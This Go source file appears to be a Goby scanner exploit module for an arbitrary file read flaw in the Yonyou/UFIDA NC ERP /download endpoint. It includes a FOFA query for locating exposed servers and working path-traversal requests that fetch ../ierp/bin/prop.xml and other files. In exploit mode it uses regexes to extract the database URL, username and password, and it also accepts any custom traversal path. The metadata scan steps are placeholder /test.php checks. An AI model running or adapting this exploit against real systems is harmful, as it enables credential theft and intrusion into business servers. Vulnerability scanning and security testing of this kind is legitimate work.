package exploits

import (
	"errors"
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "yonyou-NC /download File Read Vulnerability",
    "Description": "<p>UFIDA NC-Cloud is a cloud service product for small and medium-sized enterprises (SMEs) launched by UFIDA Network Technology Inc. </p><p>An arbitrary file read vulnerability exists in the UFIDA NC Cloud /download interface, through which an attacker can read important system files (e.g., database configuration files, system configuration files), database configuration files, and so on, resulting in the website being in an extremely insecure state.</p>",
    "Product": "yonyou-ERP-NC",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2024-06-09",
    "PostTime": "2024-09-04",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title=\"YONYOU NC\" && (body=\"UAP_Login_v6.jar\" || body=\"用友网络\")",
    "GobyQuery": "title=\"YONYOU NC\" && (body=\"UAP_Login_v6.jar\" || body=\"用友网络\")",
    "Level": "1",
    "Impact": "<p>An arbitrary file read vulnerability exists in the UFIDA NC Cloud /download interface, through which an attacker can read important system files (e.g., database configuration files, system configuration files), database configuration files, and so on, resulting in the website being in an extremely insecure state.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/qq_39894062/article/details/139542715#:~:text=%E7%94%A8%E5%8F%8BNC%20%E7%B3%BB%E7%BB%9F"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "prop.xml,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "../webapps/nc_web/WEB-INF/web.xml",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "用友NC /download 文件读取漏洞",
            "Product": "用友-ERP-NC",
            "Description": "<p>用友NC-Cloud是用友网络科技公司推出的一款面向中小企业的云服务产品。&nbsp;</p><p>用友NC Cloud /download接口存在任意文件读取漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "yonyou-NC /download File Read Vulnerability",
            "Product": "yonyou-ERP-NC",
            "Description": "<p>UFIDA NC-Cloud is a cloud service product for small and medium-sized enterprises (SMEs) launched by UFIDA Network Technology Inc.&nbsp;</p><p>An arbitrary file read vulnerability exists in the UFIDA NC Cloud /download interface, through which an attacker can read important system files (e.g., database configuration files, system configuration files), database configuration files, and so on, resulting in the website being in an extremely insecure state.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>An arbitrary file read vulnerability exists in the UFIDA NC Cloud /download interface, through which an attacker can read important system files (e.g., database configuration files, system configuration files), database configuration files, and so on, resulting in the website being in an extremely insecure state.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9949"
}`
	postOrGet_wsedyuifhyisghfyughseudhfvyusdgvgbtsdgfsddf := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		requestConfig := httpclient.NewGetRequestConfig("/portal/pt/downCourseWare/download?fileName=" + fileUrl + "&pageId=login")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		return respTxt, nil
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/portal/pt/downCourseWare/download"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"../webapps/nc_web/WEB-INF/web.xml": "nc.bs.framework.server.WebApplicationStartupHook",
				"../ierp/bin/prop.xml":              "nc.bs.mw.sql.UFSqlObject",
			}
			// 函数继承
			uploadFileFunc := postOrGet_wsedyuifhyisghfyughseudhfvyusdgvgbtsdgfsddf

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"prop.xml": {"../ierp/bin/prop.xml", "password"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_wsedyuifhyisghfyughseudhfvyusdgvgbtsdgfsddf

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}
			if mode != "Customize" {
				re, _ := regexp.Compile(`<databaseUrl>((.|\n)*?)<\/databaseUrl>`)
				//检查是否有匹配到内容
        fmt.Println(resp)
				if !re.MatchString(resp) {
					//正则匹配不到输出全部文件内容
					expResult.Success = true
					expResult.Output = resp
					return expResult
				}
				match := re.FindStringSubmatch(resp)
				tmpresp := "Key information extraction:\r\ndatabaseUrl: " + match[1]

        re, _ = regexp.Compile(`<user>((.|\n)*?)<\/user>`)
				//检查是否有匹配到内容
				if !re.MatchString(resp) {
					//正则匹配不到输出全部文件内容
					expResult.Success = true
					expResult.Output = resp
					return expResult
				}
				match = re.FindStringSubmatch(resp)
				tmpresp = tmpresp+"\r\nuser: " + match[1]

        re, _ = regexp.Compile(`<password>((.|\n)*?)<\/password>`)
				//检查是否有匹配到内容
				if !re.MatchString(resp) {
					//正则匹配不到输出全部文件内容
					expResult.Success = true
					expResult.Output = resp
					return expResult
				}
				match = re.FindStringSubmatch(resp)
				tmpresp = tmpresp+"\r\npassword: " + match[1]
        resp = tmpresp+"\r\n\r\nAll file contents:\r\n" + resp
			}
			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
